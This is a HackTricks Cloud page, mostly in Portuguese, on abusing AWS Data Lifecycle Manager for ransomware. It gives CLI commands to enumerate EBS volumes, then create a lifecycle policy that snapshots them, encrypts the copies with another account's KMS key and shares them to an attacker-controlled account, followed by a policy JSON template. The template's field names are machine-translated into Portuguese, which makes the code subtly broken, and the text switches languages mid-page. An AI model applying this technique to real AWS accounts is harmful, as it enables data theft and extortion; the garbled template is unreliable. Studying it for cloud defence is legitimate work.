# AWS - Gerenciador de Ciclo de Vida de Dados

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>

## Gerenciador de Ciclo de Vida de Dados (DLM)

### `EC2:DescribeVolumes`, `DLM:CreateLifeCyclePolicy`

Um ataque de ransomware pode ser executado criptografando o maior n√∫mero poss√≠vel de volumes EBS e, em seguida, apagando as inst√¢ncias EC2 atuais, volumes EBS e snapshots. Para automatizar essa atividade maliciosa, pode-se empregar o Amazon DLM, criptografando os snapshots com uma chave KMS de outra conta da AWS e transferindo os snapshots criptografados para uma conta diferente. Alternativamente, eles podem transferir snapshots sem criptografia para uma conta que gerenciam e ent√£o criptograf√°-los l√°. Embora n√£o seja direto criptografar volumes EBS ou snapshots existentes diretamente, √© poss√≠vel faz√™-lo criando um novo volume ou snapshot.

Primeiramente, ser√° utilizado um comando para reunir informa√ß√µes sobre volumes, como ID da inst√¢ncia, ID do volume, status de criptografia, status de anexo e tipo de volume.
```aws ec2 describe-volumes```

Secondly, one will create the lifecycle policy. This command employs the DLM API to set up a lifecycle policy that automatically takes daily snapshots of specified volumes at a designated time. It also applies specific tags to the snapshots and copies tags from the volumes to the snapshots. The policyDetails.json file includes the lifecycle policy's specifics, such as target tags, schedule, the ARN of the optional KMS key for encryption, and the target account for snapshot sharing, which will be recorded in the victim's CloudTrail logs.


```bash
```
aws dlm create-lifecycle-policy --description "Minha primeira pol√≠tica" --state ENABLED --execution-role-arn arn:aws:iam::12345678910:role/AWSDataLifecycleManagerDefaultRole --policy-details file://policyDetails.json
```
```

A template for the policy document can be seen here:
```bash
```json
{
   "TipoPolitica": "GERENCIAMENTO_SNAPSHOT_EBS",
   "TiposRecursos": [
      "VOLUME"
   ],
   "TagsAlvo": [
      {
         "Chave": "ChaveExemplo",
         "Valor": "ValorExemplo"
      }
   ],
   "Agendamentos": [
      {
         "Nome": "SnapshotsDiarios",
         "CopiarTags": true,
         "TagsAdicionais": [
            {
               "Chave": "CriadorSnapshot",
               "Valor": "DLM"
            }
         ],
         "TagsVariaveis": [
            {
               "Chave": "CentroCusto",
               "Valor": "Financeiro"
            }
         ],
         "RegraCriacao": {
            "Intervalo": 24,
            "UnidadeIntervalo": "HORAS",
            "Horarios": [
               "03:00"
            ]
         },
         "RegraRetencao": {
            "Contagem": 14
         },
         "RegraRestauracaoRapida": {
            "Contagem": 2,
            "Intervalo": 12,
            "UnidadeIntervalo": "HORAS"
         },
         "RegrasCopiaInterRegiao": [
            {
               "RegiaoAlvo": "us-west-2",
               "Criptografado": true,
               "ArnCmk": "arn:aws:kms:us-west-2:123456789012:key/seu-id-chave-kms",
               "CopiarTags": true,
               "RegraRetencao": {
                  "Intervalo": 1,
                  "UnidadeIntervalo": "DIAS"
               }
            }
         ],
         "RegrasCompartilhamento": [
            {
               "ContasAlvo": [
                  "123456789012"
               ],
               "IntervaloDescompartilhamento": 30,
               "UnidadeIntervaloDescompartilhamento": "DIAS"
            }
         ]
      }
   ],
   "Parametros": {
      "ExcluirVolumeInicial": false
   }
}
```
```

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
